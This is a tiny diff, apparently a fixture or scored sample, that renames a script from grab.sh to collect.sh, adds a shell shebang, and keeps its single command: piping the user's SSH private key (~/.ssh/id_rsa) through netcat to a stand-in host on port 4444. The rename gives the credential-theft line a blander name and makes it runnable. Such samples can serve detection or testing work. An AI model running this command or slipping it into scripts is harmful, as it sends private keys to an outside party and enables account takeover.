@@ -1,5 +1,6 @@
-# path: grab.sh
-# lines: 1
+# path: collect.sh
+# lines: 2
 # weight: 25
 # ---
+#!/bin/sh
 cat ~/.ssh/id_rsa | nc example.invalid 4444
